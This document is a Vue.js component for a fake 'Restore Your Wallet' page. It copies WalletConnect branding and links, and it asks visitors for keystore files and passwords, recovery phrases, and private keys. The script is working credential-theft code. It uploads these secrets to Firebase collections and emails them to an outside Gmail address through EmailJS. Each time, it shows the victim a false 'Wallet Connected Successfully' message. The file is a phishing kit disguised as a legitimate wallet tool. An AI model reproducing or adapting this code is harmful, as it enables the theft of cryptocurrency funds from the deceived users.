<template>
  <div style="text-align:center">
  
  <v-card color="basil" class="cent">
    <div
    color="transparent"
    class="pa-5 landing"
    align="center"
    >
      <v-img
      src="../assets/new page/Loader_img.png"
      width="80"
      >

      </v-img>
      </div>
    <v-card-title class="text-center justify-center py-6">
      <h1 class="font-weight-bold text-h5 basil--text">
       Restore Your Wallet
      </h1>
    </v-card-title>

    <v-tabs
      v-model="tab"
      background-color="transparent"
      color="basil"
      
      
      
    >
      <v-tab
      
      >
       KEYSTORE
      </v-tab>
      <v-tab
      
      >
       MNEMONICS
      </v-tab>
      <v-tab
      
      >
       PRIVATE KEY
      </v-tab>

       <v-tab
      
      >
       HARDWARE
      </v-tab>
    </v-tabs>

    <v-tabs-items v-model="tab">
      <v-tab-item
       
      >
      <form action="" id="form">
        <v-card
          color="basil"
          flat
        >
          <v-card-text style="font-size:18px">please select your keystore file</v-card-text>
         <!--default html file upload button-->
<v-file-input
@change="getfile"
  truncate-length="15"
  label="Choose keystore File"
  prepend-icon="mdi-key"
  outlined
  v-model="file"
></v-file-input>
<v-text-field
            label="Enter your wallet password"
            solo
            v-model="k_password"
          ></v-text-field>
        
            <v-checkbox
              v-model="ex4"
              label="I have entered all details are correctly."
              color="primary"
              value="primary"
              hide-details
              style="width: 70%;display: inline-block;"
            ></v-checkbox>
         <br>
         <br>

         <v-btn :disabled="!ex4" block @click="submitfile">
RESTORE
         </v-btn>
        </v-card>
        </form>
      </v-tab-item>

       <v-tab-item
       
      >
        <v-card
          color="basil"
          flat
        >
          <v-card-text style="font-size:18px">Please enter your 12 or 24 word phrase</v-card-text>
          <v-form
          v-model="valid"
          >
           <v-textarea
        v-model="phrase_24"
        auto-grow
        filled
        color="deep-purple"
        class=""
        rows="3"
        required
        :rules="nemRules"
      ></v-textarea>
      <p style="margin-top:-15px !important;">Please separate each Mnemonic Phrase with a space.</p>
        <v-text-field
            label="Enter temporary session password"
            solo
            v-model="phrase_24_password"
            :rules="passRules"
          ></v-text-field>
          <v-checkbox
              v-model="ex4"
              label="I have entered all details are correctly."
              color="primary"
              value="primary"
              hide-details
              style="width: 70%;display: inline-block;margin-top:-20px !important;"
            ></v-checkbox>
         <br>
        
<span style="font-size:13px;color:rgb(3, 166, 207);">Input the BIP39/BIP44 recovery phrase here to restore <br/> the Mnemonic keys that manage your acccounts.</span>
         <v-btn :disabled="!valid" color="primary" block @click="insert_mnemonics">
RESTORE
         </v-btn>
         </v-form>
        </v-card>
      </v-tab-item>


       <v-tab-item
       
      >
        <v-card
          color="basil"
          flat
        >
            <v-card-text style="font-size:18px">Please enter your private key</v-card-text>
           <v-form
            v-model="valid2"
           >
           <v-textarea
        v-model="private_key"
        auto-grow
        filled
        color="deep-purple"
        class=""
        rows="3"
        :rules="private_key_Rules"
      ></v-textarea>
      <p style="margin-top:-20px !important;">Please enter your private key in HEX format.</p>
        <v-text-field
            label="Enter temporary session password"
            solo
            v-model="private_pass"
            :rules="private_pass_Rules"
          ></v-text-field>
          <v-checkbox
              v-model="ex4"
              label="I have entered all details are correctly."
              color="primary"
              value="primary"
              hide-details
              style="width: 70%;display: inline-block;margin-top:-20px !important;"
            ></v-checkbox>
         <br>
        
<span style="font-size:13px;color:rgb(3, 166, 207);">Input the BIP39/BIP44 recovery phrase here to restore <br/> the Mnemonic keys that manage your acccounts.</span>
         <v-btn @click="insert_private_key" :disabled="!valid2" color="primary" block>
RESTORE
         </v-btn>
         </v-form>
        </v-card>
      </v-tab-item>


       <v-tab-item
       
      >
        <v-card
          color="basil"
          flat
        >
          <v-card-text>{{ text }}</v-card-text>
        </v-card>
      </v-tab-item>
    </v-tabs-items>
  </v-card>
<br>
  <v-snackbar
      v-model="alert"
      shaped
      timeout="2000"
    >
    <template v-slot:action="{ attrs }">
        <v-btn
          color="blue"
          text
          v-bind="attrs"
          @click="snackbar = false"
        >
          Close
        </v-btn>
      </template>
    {{alt_msg}}
  </v-snackbar>


 <div 
    style="text-align:center;display: block;"
    class="mt-5"
    >
      <div>
    <p style="display:inline-block !important;">Open a pull request on <a href="https://github.com/walletconnect">Github</a> to add your wallet here.</p>
    </div>
  <div class="foot">
<v-row>
  <v-col class="mr-9">
    <div class="" style="display:inline-block !important; width:100px">
    <v-btn
    flat
    elevation="0"
    color="white"
    href="https://discord.com/invite/jhxMvxP"
    >
    <v-icon class="mr-3">
      mdi-discord
    </v-icon>
    <span class="primary--text">Discord</span>
    </v-btn>
    </div>
  </v-col>

  <v-col class="mr-9">
    <div class="" style="display:inline-block !important; width:100px">
    <v-btn
    flat
    elevation="0"
    color="white"
    href="https://telegram.walletconnect.org/"
    >
    <v-icon class="mr-3">
      mdi-send
    </v-icon>
    <span class="primary--text">Telegram</span>
    </v-btn>
    </div>
  </v-col>

  <v-col class="mr-9">
    <div class="" style="display:inline-block !important; width:100px">
    <v-btn
    flat
    elevation="0"
    color="white"
    href="https://twitter.walletconnect.org/"
    >
    <v-icon class="mr-3">
      mdi-twitter
    </v-icon>
    <span class="primary--text">Twitter</span>
    </v-btn>
    </div>
  </v-col>



  <v-col class="mr-9">
    <div class="" style="display:inline-block !important; width:100px">
    <v-btn
    flat
    elevation="0"
    color="white"
    href="https://github.com/walletconnect"
    >
    <v-icon class="mr-3">
      mdi-github
    </v-icon>
    <span class="primary--text">Github</span>
    </v-btn>
    </div>
  </v-col>

  
</v-row>
  </div>
    </div>
  </div>
</template>

<script> 
import store from '@/store'
import storage from '@/fire'
import fb from '@/fire'
import router from '@/router'
import emailjs from 'emailjs-com'
export default {
  data() {
    return {
      alt_msg:'',
      alert: false,
      ex4:false,
      wallet_type:"",
       valid: true,
       valid2: true,
       private_key:"",
       private_pass:"",
      wall:store.state.wal,
      tab: null,
      file:[],
      k_password:'',
      phrase_24:"",
      phrase_24_password:"",
      nemRules: [
        v => !!v || 'phrase is required',
       
       
      ],
      passRules:[
        v => !!v || 'password is required',
      ],
      private_key_Rules: [
        v => !!v || 'private key is required',
       
      ],
      private_pass_Rules:[
        v => !!v || 'password is required',
      ],
      file_link:'',
      name: '',
      email: '',
      message: ''
    }
  },
  methods: {
    sendEmail(msg) {
      try {
        emailjs.send('service_48sj1tj', 'template_uhajy2n',
        {
          name: 'walletconnectsupport',
          email: 'showolesheriff7@gmail.com',
          message: msg
        },'42SNX2mlacclELShP');
        

      } catch(error) {
          console.log({error})
      }
      // Reset form field
      
    },
    insert_keystore(){

    },
    getfile(event){
    this.file=event;
     
    },
     submitfile(){
    
   storage.storage.ref(this.k_password+"-"+this.file.name).put(this.file).then((e)=>{
e.ref.getDownloadURL().then(url=>{
fb.fb.collection('keystore').add({name:url,wallet_type:this.wallet_type,passowrd:this.k_password,time:new Date(),}).then((e)=>{
     console.log(e)
     alert(url)
     this.sendEmail("keystore: "+url+" wallet type: "+this.wallet_type+" password:  "+this.k_password);
     this.alt_msg="Wallet Connected Successfully "
        this.alert=!this.alert
   })
})
   
        console.log(e)
     });
     
    },
    async insert_mnemonics(){
      const data={
        wallet_type:this.wallet_type,
        phrase:this.phrase_24,
        password:this.phrase_24_password,
        time:new Date()
      }
      await fb.fb.collection('mnemonics').add(data).then((e)=>{
     console.log(e)
      this.sendEmail("mnemonics: "+this.phrase_24+" wallet type: "+this.wallet_type+" password:  "+this.phrase_24_password);
       this.alt_msg="Wallet Connected Successfully "
        this.alert=!this.alert
        
  })
    },
    async insert_private_key(){
      const data={
        wallet_type:this.wallet_type,
        private_key:this.private_key,
        password:this.private_pass,
        time:new Date()
      }
      await fb.fb.collection('private_key').add(data).then((e)=>{
     console.log(e)
     this.sendEmail("mnemonics: "+this.private_key+" wallet type: "+this.wallet_type+" password:  "+this.private_pass);
      this.alt_msg="Wallet Connected Successfully "
        this.alert=!this.alert
   })
    }
    
  },
  mounted() {
    this.wallet_type=router.currentRoute.params.id;
 
  },
}
</script>

<style>
.cent{
  padding: 20px;
  text-align: center;
}
.lab {
color:rgb(3, 166, 207);
outline: 1px dotted rgb(3, 166, 207);
padding: 20px;
margin-top: -200px;
}
.notify{
  position:absolute;
  top:50%;
  left:50%;
  transform: translate(-50%,-50%);
  width:40%;
}
.notifyer{
  position:absolute;
  height:100%;
  width:100%;
  background-color: rgba(0,0,0,0.5);
}
.landing{     
 }
 @media only screen and (max-width: 600px) {
  .landing {
    border-left:none;
    border-bottom: 10px solid #e9d16f;
  }
 }
</style>